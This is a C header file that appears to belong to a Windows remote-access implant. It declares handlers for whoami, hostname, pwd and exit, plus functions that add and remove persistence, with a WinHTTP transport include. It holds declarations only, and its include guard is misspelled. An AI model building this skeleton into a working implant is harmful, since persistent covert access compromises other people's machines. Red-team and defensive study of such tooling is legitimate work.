#ifndef _COMAMND_H
#define _COMMAND_H

#include <stdio.h>
#include <windows.h>
#include <string.h>
#include <stdlib.h>
#include <tlhelp32.h>
#include "base.h"
#include "transport_winhttp.h"

char * customWhoami( );
char * customHostname( );
char * customPwd( );
void   customExit( );
char * addPersistence( );
char * delPersistence( );

#endif // _COMMAND_H